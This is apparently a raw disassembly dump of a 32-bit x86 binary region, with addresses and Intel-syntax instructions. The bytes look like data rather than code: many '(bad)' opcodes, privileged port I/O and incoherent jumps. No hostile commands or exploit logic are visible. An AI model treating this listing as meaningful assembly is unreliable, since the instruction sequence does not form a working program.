  425df5:	xchg   ebp,eax
  425df6:	pop    ebp
  425df7:	das    
  425df8:	xchg   esp,eax
  425df9:	not    DWORD PTR [ebx-0x6a848761]
  425dff:	loopne 0x425ddd
  425e01:	punpcklwd mm0,DWORD PTR [ecx]
  425e04:	lock jo 0x425df6
  425e07:	dec    edx
  425e08:	loop   0x425e08
  425e0a:	push   edx
  425e0b:	mov    cl,0xa2
  425e0d:	sub    ch,0xe9
  425e10:	mov    dl,0xe4
  425e12:	mov    edi,0x75df7526
  425e17:	mov    BYTE PTR ds:0xba11ce4f,cl
  425e1d:	or     al,0x27
  425e1f:	pop    ecx
  425e20:	xchg   edx,eax
  425e21:	es (bad) 
  425e23:	mov    DWORD PTR [edi],0xaed22e5e
  425e29:	sbb    DWORD PTR [eax],0xffffffac
  425e2c:	push   esi
  425e2d:	in     al,dx
  425e2e:	cmp    al,0xf3
  425e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e31:	sub    bl,BYTE PTR [edi+0x62]
  425e34:	pop    ss
	...
  425e95:	add    dh,al
  425e97:	jl     0x425eea
  425e99:	sar    bl,1
  425e9b:	std    
  425e9c:	(bad)  
  425e9d:	jle    0x425ea2
  425e9f:	test   BYTE PTR [edi],0xb2
  425ea2:	dec    esi
  425ea3:	in     al,dx
  425ea4:	add    BYTE PTR ds:0x1942d,ch
  425eaa:	pop    es
  425eab:	add    DWORD PTR [eax],eax
  425ead:	add    BYTE PTR [eax],cl
  425eaf:	xchg   ecx,eax
  425eb0:	mov    ah,0x41
  425eb2:	add    eax,0xfbf49dfd
  425eb7:	gs push ebp
  425eb9:	neg    BYTE PTR [edx]
  425ebb:	je     0x425ecf
  425ebd:	mov    DWORD PTR [edx],edx
  425ebf:	sbb    DWORD PTR ds:0xe02f8bdf,esp
  425ec5:	xchg   ebp,eax
  425ec6:	gs push ecx
  425ec8:	out    0x9e,eax
  425eca:	push   ecx
  425ecb:	jl     0x425ed5
  425ecd:	stos   BYTE PTR es:[edi],al
  425ece:	inc    ebx
  425ecf:	pop    es
  425ed0:	push   ss
  425ed1:	in     al,0x2d
  425ed3:	mov    bl,0x40
  425ed5:	mov    DWORD PTR [ecx-0x5108c101],ebx
  425edb:	add    ch,BYTE PTR [edi]
  425edd:	(bad)  
  425ede:	rcl    BYTE PTR [eax],0x38
  425ee1:	(bad)  
  425ee2:	mov    edx,0x8f857958
  425ee7:	add    eax,0xa0888764
  425eec:	xchg   esi,eax
  425eed:	les    ebx,FWORD PTR [edi-0x7f5dd91d]
  425ef3:	push   esp
  425ef4:	mov    esi,0x7d057947
  425ef9:	out    0x1e,eax
  425efb:	lods   eax,DWORD PTR ds:[esi]
  425efc:	and    al,0xdf
  425efe:	mov    ebp,0x549542c4
  425f03:	pop    es
  425f04:	add    BYTE PTR [esi-0x8bf1cd9],dl
  425f0a:	out    0xd5,al
  425f0c:	sub    BYTE PTR [ebx],al
  425f0e:	scas   al,BYTE PTR es:[edi]
  425f0f:	pop    ss
  425f10:	ror    DWORD PTR [edx-0x3ce2258c],0x10
  425f17:	inc    eax
  425f18:	(bad)  
  425f19:	iret   
  425f1a:	hlt    
  425f1b:	int    0xef
  425f1d:	mov    eax,ds:0x370b13ba
  425f22:	mov    al,0x39
  425f24:	push   cs
  425f25:	test   eax,0x2a7ba297
  425f2a:	repnz dec esi
  425f2c:	cmp    al,0x12
  425f2e:	inc    edx
  425f2f:	dec    eax
  425f30:	or     dh,BYTE PTR ds:0x62a17754
  425f36:	mov    eax,ds:0xcc3b3d63
  425f3b:	pop    ss
  425f3c:	outs   dx,BYTE PTR ds:[esi]
  425f3d:	lock dec eax
  425f3f:	jne    0x425f80
  425f41:	pop    eax
  425f42:	enter  0x16ab,0x6b
  425f46:	mov    WORD PTR [edi-0x1b],?
  425f49:	pushf  
  425f4a:	xor    ebx,DWORD PTR [edx-0x5da413ab]
  425f50:	jecxz  0x425f9e
  425f52:	add    BYTE PTR [bx+di-0x1],0xc7
  425f57:	dec    ecx
  425f58:	ret    
  425f59:	scas   eax,DWORD PTR es:[edi]
  425f5a:	dec    esi
  425f5b:	gs fmulp st(6),st
  425f5e:	ror    DWORD PTR [ebp+0x2902c110],0x6
  425f65:	ja     0x425f5a
  425f67:	dec    edi
  425f68:	cmp    al,0xf9
  425f6a:	das    
  425f6b:	add    BYTE PTR [edx-0x64e009c6],0x1f
  425f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f73:	inc    edi
  425f74:	xchg   ebx,eax
  425f75:	mov    cl,0x74
  425f77:	dec    edx
  425f78:	pusha  
  425f79:	lahf   
  425f7a:	add    al,0x54
  425f7c:	out    dx,al
  425f7d:	fstp   TBYTE PTR [ebp-0x4f]
  425f80:	loopne 0x425f59
  425f82:	add    edi,DWORD PTR ds:0xa4d7fa9b
  425f88:	jo     0x425fab
  425f8a:	cmc    
  425f8b:	dec    ecx
  425f8c:	mov    esi,0x4b6e3e84
  425f91:	test   BYTE PTR [ecx-0x20],0x5e
  425f95:	(bad)  
  425f97:	sub    eax,0xef4ec12a
  425f9c:	sbb    edi,esi
  425f9e:	push   0x654ca27c
  425fa3:	into   
  425fa4:	pushf  
  425fa5:	addr16 inc esp
  425fa7:	mov    edi,0xc7f09dc3
  425fac:	cmp    ch,bh
  425fae:	dec    ebp
  425faf:	fs retf 0x1f5d
  425fb3:	pop    esi
  425fb4:	mov    ah,0x0
	...
  426016:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42601c:	cmp    eax,0x791073bf
  426021:	mov    esi,0x44ab8824
  426026:	xor    al,0x95
  426028:	add    DWORD PTR [eax],eax
  42602a:	pop    es
  42602b:	add    DWORD PTR [eax],eax
  42602d:	add    ah,dl
  42602f:	outs   dx,BYTE PTR ds:[esi]
  426030:	(bad)
  426033:	(bad)  
  426034:	daa    
  426035:	dec    esi
  426036:	(bad)  
  426038:	inc    ecx
  426039:	sbb    DWORD PTR [ebx+0x22f338b3],edx
  42603f:	sbb    DWORD PTR [edx-0x4e],esp
  426042:	sbb    eax,0xaeeab21
  426047:	pop    es
  426048:	call   0x150505d7
  42604d:	ins    BYTE PTR es:[edi],dx
  42604e:	sbb    eax,0xb9a98842
  426053:	jecxz  0x426004
  426055:	int    0xaa
  426057:	sahf   
  426058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426059:	sub    esi,DWORD PTR [ebx-0x56]
  42605c:	stos   BYTE PTR es:[edi],al
  42605d:	aaa    
  42605e:	inc    esp
  42605f:	mov    ebx,0xc1281c5f
  426064:	enter  0xf4db,0x44
  426068:	pop    es
  426069:	shr    ah,0xf6
  42606c:	(bad)  
  42606d:	jnp    0x4260af
  42606f:	int    0xb8
  426071:	jno    0x426024
  426073:	outs   dx,BYTE PTR ds:[esi]
  426074:	iret   
  426075:	mov    dh,0xc1
  426077:	lea    esi,ds:0x4d5fac98
  42607d:	mov    ch,0xc3
  42607f:	adc    DWORD PTR [edx-0xf],ebx
  426082:	push   edi
  426083:	dec    esi
  426084:	mov    eax,ds:0x1bb0b064
  426089:	inc    edx
  42608a:	mov    BYTE PTR [ebx+0x2e],ch
  42608d:	cmp    BYTE PTR [edx+ebp*2],al
  426090:	mov    al,0xf7
  426092:	nop
  426093:	xor    dh,BYTE PTR [ebx+0xa]
  426096:	pop    ss
  426097:	pop    es
  426098:	dec    ebx
  426099:	push   esi
  42609a:	pop    ebx
  42609b:	pop    eax
  42609c:	retf   
  42609d:	es dec ebp
  42609f:	lock into 
  4260a1:	out    0xb7,eax
  4260a3:	jb     0x426113
  4260a5:	fs pop ds
  4260a7:	sub    BYTE PTR [esi-0x2],0x51
  4260ab:	enter  0xc15d,0xb6
  4260af:	mov    ch,0xe6
  4260b1:	and    ecx,DWORD PTR [edx]
  4260b3:	not    DWORD PTR [esi]
  4260b5:	xchg   BYTE PTR [edx+eiz*2+0x1],dh
  4260b9:	sahf   
  4260ba:	stos   BYTE PTR es:[edi],al
  4260bb:	push   edx
  4260bc:	(bad)  
  4260bd:	jecxz  0x42607c
  4260bf:	popf   
  4260c0:	mov    ebx,0x87e4fd9f
  4260c5:	ror    BYTE PTR [eax+0x79],cl
  4260c8:	xchg   edx,eax
  4260c9:	inc    ecx
  4260ca:	enter  0x8451,0xbc
  4260ce:	not    BYTE PTR [edx+ebx*8-0x3c]
  4260d2:	push   0x23bbe89e
  4260d7:	clc    
  4260d8:	add    BYTE PTR [eax-0x52],0xe6
  4260dc:	and    eax,0xed778781
  4260e1:	test   eax,0x39073c07
  4260e6:	(bad)  
  4260e7:	in     eax,dx
  4260e8:	or     dh,BYTE PTR gs:[ebx]
  4260eb:	inc    eax
  4260ec:	add    BYTE PTR [ecx-0x3d],bl
  4260ef:	sub    eax,0xa901af8a
  4260f4:	push   edx
  4260f5:	mov    al,0x1
  4260f7:	mov    ecx,0x520dabc4
  4260fc:	inc    ebx
  4260fd:	and    eax,0xc3e15cb8
  426102:	cmc    
  426103:	inc    ecx
  426104:	pop    ecx
  426105:	div    BYTE PTR ds:0x489cbb67
  42610b:	lea    esp,[ebp+0x52]
  42610e:	stos   DWORD PTR es:[edi],eax
  42610f:	stc    
  426110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426111:	jge    0x42610a
  426113:	push   esi
  426114:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  426116:	push   cs
  426117:	call   0x64f2f9dd
  42611c:	sub    edi,DWORD PTR [edx-0x420105d2]
  426122:	retf   
  426123:	jo     0x42616e
  426125:	cmp    esp,DWORD PTR [ebp-0xc188a50]
  42612b:	mov    edi,0x49a0b8cc
  426130:	add    ebp,edi
  426132:	ins    BYTE PTR es:[edi],dx
  426133:	cwde   
  426134:	jnp    0x426136
	...
  426196:	fwait
  426197:	and    DWORD PTR [edi],ecx
  426199:	popa   
  42619a:	mov    edi,0x6ffbff6f
  42619f:	sub    BYTE PTR [ebx+0x76bf5383],bh
  4261a5:	retf   0x963b
  4261a8:	add    DWORD PTR [eax],eax
  4261aa:	pop    es
  4261ab:	add    DWORD PTR [eax],eax
  4261ad:	add    ah,bh
  4261af:	xor    DWORD PTR [ebp+0x4d],eax
  4261b2:	ret    0xe9e6
  4261b5:	and    esp,DWORD PTR cs:[edi-0x114e75af]
  4261bc:	(bad)  
  4261bd:	ja     0x426141
  4261bf:	mov    eax,ds:0x7f23d52d
  4261c4:	or     ecx,0x7c
  4261c7:	in     eax,dx
  4261c8:	es mov esp,0x790587ad
  4261ce:	pop    eax
  4261cf:	xor    eax,0xb66e6b9b
  4261d4:	inc    eax
  4261d5:	mov    ds:0xc88794d5,ax
  4261db:	lahf   
  4261dc:	inc    esi
  4261dd:	mov    edx,DWORD PTR [ebp+0x39c50370]
  4261e3:	fsub   st(4),st
  4261e5:	adc    dl,BYTE PTR [edi+0x7db6bd40]
  4261eb:	cmp    BYTE PTR [edx],al
  4261ed:	jo     0x4261f4
  4261ef:	inc    ebx
  4261f0:	inc    esi
  4261f1:	pop    esp
  4261f2:	cmp    al,0x2e
  4261f4:	xor    bh,cl
  4261f6:	push   esp
  4261f7:	sahf   
  4261f8:	inc    ecx
  4261f9:	sahf   
  4261fa:	mov    DWORD PTR [ebp-0x24b85eb9],eax
  426200:	in     eax,0xf2
  426202:	inc    ebx
  426203:	jae    0x4261cb
  426205:	mov    eax,ds:0x871b520a
  42620a:	mov    bh,0xc6
  42620c:	mov    ds:0xb8787335,al
  426211:	mov    esi,0xbe4ed361
  426216:	or     DWORD PTR [eax+edi*8],eax
  426219:	das    
  42621a:	rcr    DWORD PTR [esi],0x48
  42621d:	dec    ebx
  42621e:	jge    0x426276
  426220:	xchg   esi,eax
  426221:	xchg   ebp,eax
  426222:	pop    ebp
  426223:	adc    BYTE PTR [ecx+0x69916f14],ch
  426229:	add    bl,ch
  42622b:	fsub   DWORD PTR [ebx-0x9]
  42622e:	adc    eax,0xba0ad8b5
  426233:	imul   ebp,DWORD PTR [ebx-0xf],0x26
  426237:	cwde   
  426238:	ja     0x42620a
  42623a:	xor    dl,ch
  42623c:	dec    BYTE PTR [edi]
  42623e:	nop
  42623f:	jne    0x426274
  426241:	(bad)  
  426242:	std    
  426243:	sub    DWORD PTR [eax],0x2d
  426246:	lods   al,BYTE PTR ds:[esi]
  426247:	loope  0x426241
  426249:	out    dx,eax
  42624a:	cmp    al,bl
  42624c:	imul   edi,edx,0x69
  42624f:	ins    DWORD PTR es:[edi],dx
  426250:	mov    cl,0x2e
  426252:	out    dx,eax
  426253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426254:	pop    ebp
  426255:	mov    eax,ds:0x56b4403b
  42625a:	jge    0x426226
  42625c:	jo     0x4262c1
  42625e:	fst    QWORD PTR [edx]
  426260:	and    ecx,DWORD PTR [ecx+ebx*2]
  426263:	jbe    0x4261fb
  426265:	mov    edi,0x408474
  42626a:	clc    
  42626b:	inc    esi
  42626c:	dec    edx
  42626d:	aaa    
  42626e:	cld    
  42626f:	mov    DWORD PTR [ebx+0x231a3466],ebx
  426275:	sahf   
  426276:	jp     0x4262a1
  426278:	xor    esp,DWORD PTR [ecx]
  42627a:	jns    0x4262fb
  42627c:	jbe    0x4262dc
  42627e:	pop    ecx
  42627f:	pop    ecx
  426280:	add    eax,0x9b475e92
  426285:	fdiv   QWORD PTR [eax-0x2f512032]
  42628b:	jo     0x426260
  42628d:	ins    DWORD PTR es:[edi],dx
  42628e:	adc    DWORD PTR [ebx-0x5f],esp
  426291:	je     0x426299
  426293:	or     BYTE PTR [edi],ch
  426295:	pop    esp
  426296:	fiadd  DWORD PTR [edx-0x74]
  426299:	loopne 0x4262c9
  42629b:	(bad)  
  42629c:	punpcklbw mm7,DWORD PTR [ebx-0x297e477f]
  4262a3:	push   ebx
  4262a4:	jnp    0x426257
  4262a6:	in     al,dx
  4262a7:	je     0x42626f
  4262a9:	or     eax,0x32fe13a1
  4262ae:	test   DWORD PTR [edx-0x6e],ecx
  4262b1:	data16 loope 0x42624a
  4262b4:	lahf   
	...
  426315:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426319:	dec    esi
  42631a:	std    
  42631b:	out    dx,al
  42631c:	xlat   BYTE PTR ds:[ebx]
  42631d:	aas    
  42631e:	ins    BYTE PTR es:[edi],dx
  42631f:	lods   al,BYTE PTR ds:[esi]
  426320:	ret    0xa954
  426323:	arpl   WORD PTR gs:[edx+eax*2-0x69],cx
  426328:	add    DWORD PTR [eax],eax
  42632a:	pop    es
  42632b:	add    DWORD PTR [eax],eax
  42632d:	add    al,bl
  42632f:	fld    DWORD PTR [edx-0x1c]
  426332:	adc    al,0x7e
  426334:	ss mov al,0x78
  426337:	cld    
  426338:	imul   BYTE PTR [ebp-0x37134bf9]
  42633e:	stos   DWORD PTR es:[edi],eax
  42633f:	and    DWORD PTR [eax],edx
  426341:	inc    esi
  426342:	cmc    
  426343:	addr16 push eax
  426345:	rol    ecx,1
  426347:	je     0x42633d
  426349:	and    DWORD PTR [edx-0x3f],edx
  42634c:	sub    dh,dl
  42634e:	xchg   edx,eax
  42634f:	shr    edx,1
  426351:	mov    edi,DWORD PTR [ebp+0x74d64f50]
  426357:	jle    0x4263ad
  426359:	sahf   
  42635a:	(bad)  
  42635b:	out    dx,eax
  42635c:	test   al,0x78
  42635e:	test   DWORD PTR [ebp+0x1d],0x3d687f7c
  426365:	jne    0x4263db
  426367:	jae    0x426394
  426369:	aam    0x23
  42636b:	add    ch,BYTE PTR [edi-0x55]
  42636e:	mov    WORD PTR [ecx+ebp*4-0x64],?
  426372:	mov    eax,0xacfa50bf
  426377:	(bad)  
  426378:	(bad)
  42637c:	cmp    al,0x3e
  42637e:	cmp    al,0x1d
  426380:	mov    ch,0x68
  426382:	pushf  
  426383:	jne    0x426326
  426385:	sar    ebx,cl
  426387:	test   dl,dh
  426389:	push   esp
  42638a:	sar    esp,1
  42638c:	leave  
  42638d:	cmp    al,0x8b
  42638f:	lods   eax,DWORD PTR ds:[esi]
  426390:	mov    ch,0x7
  426392:	mov    ebp,0x7da6f073
  426397:	test   ax,0x1530
  42639b:	mov    bh,0x86
  42639d:	sbb    BYTE PTR [edx-0x7dc846bb],0xed
  4263a4:	iret   
  4263a5:	sub    ch,BYTE PTR [ecx+0x73]
  4263a8:	retf   0x208
  4263ab:	dec    eax
  4263ac:	cdq    
  4263ad:	add    eax,0x9a596a64
  4263b2:	es push edi
  4263b4:	outs   dx,BYTE PTR ds:[esi]
  4263b5:	dec    edx
  4263b6:	lock push ss
  4263b8:	pusha  
  4263b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263ba:	jp     0x42635d
  4263bc:	and    DWORD PTR [edi],edi
  4263be:	xchg   BYTE PTR [ebp-0x45],al
  4263c1:	cmp    eax,DWORD PTR [ebx-0x5a111e80]
  4263c7:	jle    0x42634a
  4263c9:	xchg   edi,eax
  4263ca:	iret   
  4263cb:	adc    al,0x31
  4263cd:	xor    esp,DWORD PTR [edi+esi*1-0x1d]
  4263d1:	sbb    esp,ecx
  4263d3:	push   ebx
  4263d4:	daa    
  4263d5:	int3   
  4263d6:	or     eax,0x348dd6c8
  4263db:	in     al,dx
  4263dc:	aaa    
  4263dd:	mov    dh,0xa3
  4263df:	jge    0x426417
  4263e1:	mov    edi,0xa02411e3
  4263e6:	push   cs
  4263e7:	cmp    BYTE PTR [eax+0x44],dh
  4263ea:	add    BYTE PTR [edi+0x7ba9b808],cl
  4263f0:	paddb  mm5,QWORD PTR [esi-0x36]
  4263f4:	xor    BYTE PTR [ebx-0x4d],bh
  4263f7:	or     edx,esi
  4263f9:	je     0x426475
  4263fb:	adc    ch,BYTE PTR [eax]
  4263fd:	push   cs
  4263fe:	ins    BYTE PTR es:[edi],dx
  4263ff:	int    0xd
  426401:	lock call 0xe50e85fc
  426407:	test   BYTE PTR [edx],ch
  426409:	cld    
  42640a:	ins    DWORD PTR es:[edi],dx
  42640b:	dec    ecx
  42640c:	test   BYTE PTR [edx+0x10a20a95],bh
  426412:	fisub  DWORD PTR [eax]
  426414:	inc    esp
  426415:	push   edi
  426416:	test   eax,0x56a1fda9
  42641b:	lds    ebp,FWORD PTR [ebx-0x31e7d26c]
  426421:	js     0x4263f8
  426423:	push   0x41d1870a
  426428:	aas    
  426429:	mov    bl,bh
  42642b:	stos   DWORD PTR es:[edi],eax
  42642c:	inc    eax
  42642d:	fsubr  QWORD PTR [edi-0x5b0ab52]
  426433:	ret    0xec
	...
  426496:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42649d:	outs   dx,DWORD PTR ds:[esi]
  42649e:	(bad)  
  42649f:	fistp  QWORD PTR [edx+0x4c]
  4264a2:	mov    eax,0x49abac1b
  4264a7:	cwde   
  4264a8:	add    DWORD PTR [eax],eax
  4264aa:	pop    es
  4264ab:	add    DWORD PTR [eax],eax
  4264ad:	add    ah,dh
  4264af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264b0:	xchg   ebx,eax
  4264b1:	clc    
  4264b2:	retf   
  4264b3:	addr16 popf 
  4264b5:	(bad)  
  4264b6:	mov    edi,0x546115dc
  4264bb:	arpl   WORD PTR [esi],cx
  4264bd:	out    0xa,al
  4264bf:	inc    edi
  4264c0:	mov    esp,0x386fabf4
  4264c5:	dec    ecx
  4264c6:	push   esi
  4264c7:	pop    ebp
  4264c8:	push   esp
  4264c9:	fld    DWORD PTR [ebx+0x5e]
  4264cc:	fdivr  DWORD PTR [edi+0x70]
  4264cf:	mov    cl,0x7c
  4264d1:	addr16 push 0xf29cbdb3
  4264d7:	ror    DWORD PTR [ebx+ecx*8],cl
  4264da:	xchg   DWORD PTR [ecx+esi*8],esp
  4264dd:	sbb    ch,dh
  4264df:	xor    eax,0x774a6bea
  4264e4:	call   0x7ea58763
  4264e9:	in     al,0x67
  4264eb:	sub    eax,0x9ee2f25f
  4264f0:	out    dx,al
  4264f1:	(bad)  
  4264f2:	mov    al,0xa
  4264f4:	mov    esp,0xb4408a92
  4264f9:	out    0xc0,al
  4264fb:	lock dec edx
  4264fd:	mov    esi,0x72ace358
  426502:	mov    ch,BYTE PTR [ebx+ebx*4-0x110e7204]
  426509:	in     al,dx
  42650a:	in     eax,dx
  42650b:	mov    edx,0x640838e1
  426510:	mov    ecx,0xc47dd53b
  426515:	fimul  WORD PTR [edx-0x71]
  426518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426519:	push   edi
  42651a:	inc    esp
  42651b:	sub    eax,0x7fae31de
  426520:	jle    0x426577
  426522:	sbb    bh,dh
  426524:	repz sbb ebx,DWORD PTR [ecx+0x61]
  426528:	out    dx,al
  426529:	ins    DWORD PTR es:[edi],dx
  42652a:	fwait
  42652b:	add    eax,DWORD PTR [esi+0x5e]
  42652e:	or     ecx,ebp
  426530:	addr16 pop esp
  426532:	sti    
  426533:	inc    esi
  426534:	es inc ebp
  426536:	sbb    BYTE PTR [ebx],bl
  426538:	mov    esp,0x94ac76cb
  42653d:	out    dx,al
  42653e:	xchg   ebx,eax
  42653f:	inc    BYTE PTR ds:0xb670d805
  426545:	sub    al,0xbc
  426547:	in     eax,dx
  426548:	clc    
  426549:	int3   
  42654a:	mov    ecx,0x1a1c1905
  42654f:	or     BYTE PTR [esi],cl
  426551:	push   ebx
  426552:	retf   0x38e0
  426555:	daa    
  426556:	gs int 0x84
  426559:	cs leave 
  42655b:	repnz xor al,BYTE PTR [edx]
  42655e:	aam    0xa8
  426560:	pop    ss
  426561:	jge    0x42653f
  426563:	mov    cl,0x72
  426565:	std    
  426566:	int3   
  426567:	mov    bl,0xb2
  426569:	enter  0x26f,0x62
  42656d:	retf   
  42656e:	push   edx
  42656f:	add    al,0xae
  426571:	adc    eax,0xde03c46
  426576:	inc    DWORD PTR [eax]
  426578:	shr    DWORD PTR [edi+ecx*8-0xebe1d8],1
  42657f:	mov    cl,dl
  426581:	inc    ecx
  426582:	push   esi
  426583:	sub    ebp,DWORD PTR [eax]
  426585:	and    DWORD PTR [eax-0x62],ebp
  426588:	and    cl,BYTE PTR [edx]
  42658a:	repnz aas 
  42658c:	pushf  
  42658d:	in     eax,dx
  42658e:	add    BYTE PTR [ebx-0x29b067f6],bh
  426594:	in     eax,dx
  426595:	sbb    ebp,edx
  426597:	mov    dh,BYTE PTR [esi]
  426599:	or     BYTE PTR [ecx-0xd],al
  42659c:	xchg   ebp,eax
  42659d:	bound  ebp,QWORD PTR [ecx+0x75]
  4265a0:	jp     0x4265ca
  4265a2:	rol    ch,0xe4
  4265a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265a6:	mov    ds:0x9c1bff38,eax
  4265ab:	xchg   edi,eax
  4265ac:	or     al,dl
  4265ae:	push   0xdafc9df6
  4265b3:	sub    DWORD PTR [ebx],ecx
	...
  426615:	add    BYTE PTR [edx],dl
  426617:	retf   
  426618:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42661e:	xor    DWORD PTR [ecx+0x6f],0x2f
  426622:	mov    cl,BYTE PTR [esp+eax*2+0x1995068]
  426629:	add    BYTE PTR [edi],al
  42662b:	add    DWORD PTR [eax],eax
  42662d:	add    BYTE PTR [edi-0x5e729e78],ah
  426633:	xchg   esi,eax
  426634:	dec    ecx
  426635:	enter  0x52fa,0xbc
  426639:	jmp    0x42661f
  42663b:	mov    DWORD PTR [ecx],esi
  42663d:	in     al,0xfa
  42663f:	push   eax
  426640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426641:	repnz xchg ebx,eax
  426644:	inc    ebp
  426645:	xchg   esi,eax
  426646:	sub    al,0x77
  426648:	xor    ebp,DWORD PTR [ecx-0x59]
  42664b:	xchg   DWORD PTR [ecx+0x3fa980ab],ebx
  426651:	call   0xa7ecee12
  426656:	bnd jb 0x426689
  426659:	inc    ebx
  42665a:	into   
  42665b:	ror    al,1
  42665d:	sub    al,0x98
  42665f:	loop   0x4265ed
  426661:	sbb    eax,0x5371fcd6
  426666:	ret    0x7c37
  426669:	aaa    
  42666a:	push   edi
  42666b:	repz int3 
  42666d:	adc    al,0x8b
  42666f:	or     DWORD PTR [ecx],esi
  426671:	sbb    al,0x99
  426673:	lods   eax,DWORD PTR ds:[esi]
  426674:	or     al,0x92
  426676:	pop    ebp
  426677:	sbb    BYTE PTR [edx+0x4d6539da],bl
  42667d:	aas    
  42667e:	pop    ss
  42667f:	clc    
  426680:	mov    ds,WORD PTR [ebp-0x58073676]
  426686:	out    dx,eax
  426687:	imul   esi,DWORD PTR [ecx+0x67814a7d],0xac6e0b64
  426691:	dec    ebx
  426692:	stos   DWORD PTR es:[edi],eax
  426693:	mov    ch,0xb3
  426695:	or     eax,0xf4118422
  42669a:	enter  0xd960,0xe2
  42669e:	retf   0xd897
  4266a1:	stc    
  4266a2:	dec    edi
  4266a3:	add    BYTE PTR [eax-0x4567fd52],0x56
  4266aa:	popf   
  4266ab:	jb     0x426635
  4266ad:	xor    DWORD PTR [ecx-0x7c],0x6ac1814e
  4266b4:	push   ecx
  4266b5:	jmp    0x4266b3
  4266b7:	push   ecx
  4266b8:	out    dx,eax
  4266b9:	sar    DWORD PTR [ecx+0x1e33a8ab],0x4f
  4266c0:	push   ebp
  4266c1:	mov    edi,0xf1cadd3
  4266c6:	xor    DWORD PTR [edi],edi
  4266c8:	mov    eax,0x5e9f7c45
  4266cd:	test   eax,0xf2e12342
  4266d2:	aaa    
  4266d3:	xor    BYTE PTR [esi+0x71de6e88],dh
  4266d9:	jae    0x42669d
  4266db:	cmp    DWORD PTR [eax-0x26],0xffffffc6
  4266df:	shr    BYTE PTR [eax+0x31],cl
  4266e2:	gs std 
  4266e4:	bound  esp,QWORD PTR ds:0x9e77ee3c
  4266ea:	mov    ss,WORD PTR [ecx-0xd349a7]
  4266f0:	fst    QWORD PTR [ecx+edx*4-0x72303ae6]
  4266f7:	repz and al,bl
  4266fa:	retf   
  4266fb:	cdq    
  4266fc:	retf   
  4266fd:	fsubr  DWORD PTR [ebx-0x4c3d77d2]
  426703:	(bad)  
  426704:	fstp   QWORD PTR [esi-0x602de07d]
  42670a:	jo     0x42675b
  42670c:	out    dx,al
  42670d:	jge    0x426693
  42670f:	pop    edi
  426710:	or     al,0x6e
  426712:	mov    esp,es
  426714:	shl    DWORD PTR [esi+0x236406ae],0x45
  42671b:	fs mov cl,0x29
  42671e:	and    esp,ecx
  426720:	sub    BYTE PTR [ecx+0x51],ch
  426723:	pop    esi
  426724:	clc    
  426725:	mov    al,ds:0x15b8c9f1
  42672a:	outs   dx,DWORD PTR ds:[esi]
  42672b:	lds    edx,FWORD PTR [ecx-0x1eaf87d5]
  426731:	mov    cs,WORD PTR [esi+0x25]
  426734:	ret    0x0
	...
  426793:	add    BYTE PTR [eax],al
  426795:	add    BYTE PTR [eax-0xd53173],bh
  42679b:	imul   edi,esp,0xffffff9f
  42679e:	sbb    esp,eax
  4267a0:	leave  
  4267a1:	dec    ebx
  4267a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267a3:	setp   BYTE PTR [edi+edx*2]
  4267a7:	call   0x0:0x1070001
  4267ae:	mov    ebx,0x545b564
  4267b3:	daa    
  4267b4:	(bad)  
  4267b6:	inc    BYTE PTR [ebp+0x2c]
  4267b9:	or     al,0xc
  4267bb:	nop
  4267bc:	sbb    edi,DWORD PTR [edx]
  4267be:	loop   0x426744
  4267c0:	out    0x7e,eax
  4267c2:	into   
  4267c3:	dec    esp
  4267c4:	leave  
  4267c5:	das    
  4267c6:	aam    0x6b
  4267c8:	mov    eax,ds:0xc2618974
  4267cd:	test   eax,0xe3842bd6
  4267d2:	repnz add dl,BYTE PTR [eax+0x78]
  4267d6:	mov    BYTE PTR [eax+0x43],dl
  4267d9:	lds    edi,FWORD PTR [esi+edx*2]
  4267dc:	and    DWORD PTR [edi],ebp
  4267de:	adc    ebp,DWORD PTR [ebx-0x5c]
  4267e1:	cld    
  4267e2:	push   eax
  4267e3:	rcr    ch,0xf5
  4267e6:	fidivr WORD PTR [ebp-0x380a478b]
  4267ec:	fnsave [esi+ebx*4-0x24aa4ff8]
  4267f3:	xlat   BYTE PTR ds:[ebx]
  4267f4:	arpl   WORD PTR cs:[edx],cx
  4267f7:	pop    edx
  4267f8:	dec    eax
  4267f9:	hlt    
  4267fa:	push   eax
  4267fb:	call   0xffb48d49
  426800:	xlat   BYTE PTR ds:[ebx]
  426801:	stos   DWORD PTR es:[edi],eax
  426802:	sbb    ch,bl
  426804:	sti    
  426805:	in     eax,0x76
  426807:	xchg   edx,eax
  426808:	adc    DWORD PTR [ebx+0x68],esp
  42680b:	xor    ebx,DWORD PTR [ecx-0x59]
  42680e:	call   0x308976d9
  426813:	push   edx
  426814:	jg     0x426833
  426816:	(bad)  
  426817:	hlt    
  426818:	loope  0x42683e
  42681a:	pop    esp
  42681b:	cdq    
  42681c:	xor    ch,BYTE PTR [ebx-0x19]
  42681f:	nop
  426820:	cli    
  426821:	(bad)
  426825:	aaa    
  426826:	pop    esp
  426827:	push   es
  426828:	jne    0x4268a2
  42682a:	push   0x16
  42682c:	dec    eax
  42682d:	fidiv  WORD PTR [edx-0x1db88d33]
  426833:	mov    ebx,DWORD PTR [ecx-0x2f]
  426836:	or     al,0xbe
  426838:	push   esi
  426839:	and    ch,0x4f
  42683c:	inc    ebp
  42683d:	jne    0x42681e
  42683f:	int    0xa6
  426841:	mov    ah,0x24
  426843:	jle    0x42686c
  426845:	jnp    0x4268af
  426847:	loope  0x4267d1
  426849:	inc    ebx
  42684a:	(bad)  
  42684c:	rcl    BYTE PTR [edi],1
  42684e:	and    eax,0x3cf5934f
  426853:	pop    ebp
  426854:	xchg   ebp,eax
  426855:	sbb    ecx,ecx
  426857:	inc    eax
